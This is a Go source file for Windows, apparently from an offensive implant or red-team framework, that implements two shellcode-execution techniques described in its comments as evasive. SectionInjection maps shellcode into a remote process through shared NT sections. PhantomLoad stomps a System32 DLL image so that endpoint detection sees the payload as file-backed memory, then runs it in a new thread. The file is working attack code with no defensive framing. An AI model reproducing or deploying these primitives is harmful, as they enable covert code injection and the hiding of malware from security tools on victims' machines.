//go:build windows

package win

import (
	"fmt"
	"os"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Evasive injection primitives (no VirtualAllocEx / WriteProcessMemory /
// CreateRemoteThread on the section path):
//
//  1. SectionInjection — NtCreateSection(SEC_COMMIT) + local RW map → write →
//     unmap → remote RX map. No WriteProcessMemory, no VirtualAllocEx.
//  2. PhantomLoad (UDRL) — module stomping: map a small System32 DLL as an
//     image section (SEC_IMAGE), copy shellcode into the CoW pages, flip RX and
//     execute. EDR sees module-backed memory (appears to belong to a real file).

const (
	sectionAllAccess = 0x000F001F
	secCommit        = 0x08000000
	secImageAttr     = 0x01000000
	pageWriteCopy    = 0x08
	ntSyncIONonAlert = 0x00000020
	ntNonDirFile     = 0x00000040
)

var (
	procNtCreateSection     = func() uintptr { a, _ := Resolve(ModuleNtdll(), "NtCreateSection"); return a }()
	procNtOpenFile          = func() uintptr { a, _ := Resolve(ModuleNtdll(), "NtOpenFile"); return a }()
	procCreateThread        = func() uintptr { a, _ := Resolve(ModuleKernel32(), "CreateThread"); return a }()
	procWaitForSingleObject = func() uintptr { a, _ := Resolve(ModuleKernel32(), "WaitForSingleObject"); return a }()
)

// ntCreateSection creates a section object.
func ntCreateSection(hSection *uintptr, maxSize int64, prot, attrs uint32, fileHandle uintptr) error {
	if procNtCreateSection == 0 {
		return fmt.Errorf("win: NtCreateSection unresolved")
	}
	r, _, _ := syscall.SyscallN(procNtCreateSection,
		uintptr(unsafe.Pointer(hSection)),
		sectionAllAccess,
		0,
		uintptr(unsafe.Pointer(&maxSize)),
		uintptr(prot),
		uintptr(attrs),
		fileHandle,
	)
	if NtStatus(r) != 0 {
		return ntError(r)
	}
	return nil
}

// ntMapView maps a section into a process. Returns the mapped base and size.
func ntMapView(section, processHandle uintptr, prot uint32) (uintptr, uintptr, error) {
	if procNtMapViewOfSection == 0 {
		return 0, 0, fmt.Errorf("win: NtMapViewOfSection unresolved")
	}
	var base uintptr
	var size uintptr
	r, _, _ := syscall.SyscallN(procNtMapViewOfSection,
		section,
		processHandle,
		uintptr(unsafe.Pointer(&base)),
		0, 0, 0,
		uintptr(unsafe.Pointer(&size)),
		viewShare,
		0,
		uintptr(prot),
	)
	if NtStatus(r) != 0 {
		return 0, 0, ntError(r)
	}
	return base, size, nil
}

func ntUnmap(processHandle, base uintptr) {
	if procNtUnmapViewOfSection != 0 {
		syscallN(procNtUnmapViewOfSection, processHandle, base, 0, 0, 0, 0)
	}
}

// ProtectRemote flips protection of a region in a (possibly remote) process.
func ProtectRemote(processHandle uintptr, addr, size uintptr, protect uint32) error {
	var old uint32
	base := addr
	r, _, _ := syscall.SyscallN(procNtProtectVirtualMemoryFn(),
		processHandle,
		uintptr(unsafe.Pointer(&base)),
		uintptr(unsafe.Pointer(&size)),
		uintptr(protect),
		uintptr(unsafe.Pointer(&old)),
	)
	if NtStatus(r) != 0 {
		return ntError(r)
	}
	return nil
}

// procNtProtectVirtualMemoryFn lazily resolves NtProtectVirtualMemory.
func procNtProtectVirtualMemoryFn() uintptr {
	return ntProtectVirtualMemoryAddr
}

var ntProtectVirtualMemoryAddr = func() uintptr { a, _ := Resolve(ModuleNtdll(), "NtProtectVirtualMemory"); return a }()

// SectionInjection maps shellcode into a remote process via a shared section.
// Returns the remote base address where the shellcode was mapped.
func SectionInjection(targetProcess windows.Handle, sc []byte) (uintptr, error) {
	if len(sc) == 0 {
		return 0, fmt.Errorf("section: empty shellcode")
	}
	maxSize := int64(len(sc))
	var sectionH uintptr
	if err := ntCreateSection(&sectionH, maxSize, pageExecuteReadWrite, secCommit, 0); err != nil {
		return 0, fmt.Errorf("section: NtCreateSection: %w", err)
	}
	defer syscallN(procNtClose, sectionH, 0, 0, 0, 0, 0)

	// Local RW view for writing.
	localBase, _, err := ntMapView(sectionH, uintptr(windows.CurrentProcess()), pageReadWrite)
	if err != nil {
		return 0, fmt.Errorf("section: map local: %w", err)
	}
	dst := unsafe.Slice((*byte)(unsafe.Pointer(localBase)), len(sc))
	copy(dst, sc)
	ntUnmap(uintptr(windows.CurrentProcess()), localBase)

	// Remote RX view.
	remoteBase, _, err := ntMapView(sectionH, uintptr(targetProcess), pageExecuteRead)
	if err != nil {
		return 0, fmt.Errorf("section: map remote: %w", err)
	}
	return remoteBase, nil
}

// findHostDLL returns the path of the first available small System32 DLL.
func findHostDLL() string {
	sysroot := os.Getenv("SystemRoot")
	if sysroot == "" {
		sysroot = `C:\Windows`
	}
	for _, name := range []string{
		`\System32\xpsservices.dll`,
		`\System32\clbcatq.dll`,
		`\System32\msasn1.dll`,
	} {
		p := sysroot + name
		if _, err := os.Stat(p); err == nil {
			return p
		}
	}
	return ""
}

// ioStatusBlock mirrors IO_STATUS_BLOCK.
type ioStatusBlock struct {
	Status      uintptr
	Information uintptr
}

// PhantomLoad (UDRL) executes shellcode from module-backed memory: the payload
// overwrites the CoW pages of a mapped legitimate DLL image, so an EDR sees the
// region as belonging to a real System32 file. Blocks until the payload's
// thread returns. `keepAlive` spawns a detached thread and returns immediately.
func PhantomLoad(sc []byte, keepAlive bool) (uintptr, error) {
	if len(sc) == 0 {
		return 0, fmt.Errorf("phantom: empty shellcode")
	}
	hostPath := findHostDLL()
	if hostPath == "" {
		return 0, fmt.Errorf("phantom: no host DLL found in System32")
	}
	ntPath := `\??\` + hostPath
	pathU16, _ := syscall.UTF16FromString(ntPath)
	ustr := unicodeString64{
		Length:    uint16(len(pathU16)-1) * 2,
		MaxLength: uint16(len(pathU16)-1)*2 + 2,
		Buffer:    uintptr(unsafe.Pointer(&pathU16[0])),
	}
	oa := objectAttributes64{
		Length:     48,
		ObjName:    uintptr(unsafe.Pointer(&ustr)),
		Attributes: objCaseInsensitive,
	}
	if procNtOpenFile == 0 {
		return 0, fmt.Errorf("phantom: NtOpenFile unresolved")
	}

	var isb ioStatusBlock
	var fileH uintptr
	r, _, _ := syscall.SyscallN(procNtOpenFile,
		uintptr(unsafe.Pointer(&fileH)),
		uintptr(windows.FILE_READ_DATA|windows.FILE_EXECUTE|windows.SYNCHRONIZE),
		uintptr(unsafe.Pointer(&oa)),
		uintptr(unsafe.Pointer(&isb)),
		uintptr(windows.FILE_SHARE_READ|windows.FILE_SHARE_DELETE),
		uintptr(ntSyncIONonAlert|ntNonDirFile),
	)
	if NtStatus(r) != 0 {
		return 0, fmt.Errorf("phantom: NtOpenFile(%s): %w", hostPath, ntError(r))
	}
	defer syscallN(procNtClose, fileH, 0, 0, 0, 0, 0)

	// Image-backed section from the DLL file (maxSize=0 → kernel uses file size).
	var sectionH uintptr
	if err := ntCreateSection(&sectionH, 0, pageReadonly, secImageAttr, fileH); err != nil {
		return 0, fmt.Errorf("phantom: NtCreateSection(SEC_IMAGE): %w", err)
	}
	defer syscallN(procNtClose, sectionH, 0, 0, 0, 0, 0)

	// CoW view: PAGE_EXECUTE_WRITECOPY, fallback PAGE_EXECUTE_READ then protect.
	mappedBase, viewSize, err := ntMapView(sectionH, uintptr(windows.CurrentProcess()), pageExec|pageWriteCopy)
	if err != nil {
		mappedBase, viewSize, err = ntMapView(sectionH, uintptr(windows.CurrentProcess()), pageExec)
		if err != nil {
			return 0, fmt.Errorf("phantom: NtMapViewOfSection: %w", err)
		}
	}
	writeSize := uintptr(len(sc))
	if writeSize > viewSize {
		writeSize = viewSize
	}

	// RW (triggers CoW), copy, RX.
	if err := ProtectRemote(uintptr(windows.CurrentProcess()), mappedBase, writeSize, pageReadWrite); err != nil {
		ntUnmap(uintptr(windows.CurrentProcess()), mappedBase)
		return 0, fmt.Errorf("phantom: protect RW: %w", err)
	}
	dst := unsafe.Slice((*byte)(unsafe.Pointer(mappedBase)), writeSize)
	copy(dst, sc[:writeSize])
	if err := ProtectRemote(uintptr(windows.CurrentProcess()), mappedBase, writeSize, pageExec); err != nil {
		ntUnmap(uintptr(windows.CurrentProcess()), mappedBase)
		return 0, fmt.Errorf("phantom: protect RX: %w", err)
	}

	// Execute from the DLL-backed address.
	if keepAlive {
		r, _, _ := syscall.SyscallN(procCreateThread, 0, 0, mappedBase, 0, 0, 0)
		if r == 0 {
			ntUnmap(uintptr(windows.CurrentProcess()), mappedBase)
			return 0, fmt.Errorf("phantom: CreateThread failed")
		}
		syscallN(procCloseHandleFn(), r, 0, 0, 0, 0, 0)
		return mappedBase, nil
	}
	r2, _, _ := syscall.SyscallN(procCreateThread, 0, 0, mappedBase, 0, 0, 0)
	if r2 == 0 {
		ntUnmap(uintptr(windows.CurrentProcess()), mappedBase)
		return 0, fmt.Errorf("phantom: CreateThread failed")
	}
	if procWaitForSingleObject != 0 {
		syscallN(procWaitForSingleObject, r2, uintptr(^uint32(0)), 0, 0, 0, 0) // INFINITE
	}
	syscallN(procCloseHandleFn(), r2, 0, 0, 0, 0, 0)
	return mappedBase, nil
}

// procCloseHandleFn lazily resolves CloseHandle from kernel32.
func procCloseHandleFn() uintptr {
	return closeHandleAddr
}

var closeHandleAddr = func() uintptr { a, _ := Resolve(ModuleKernel32(), "CloseHandle"); return a }()
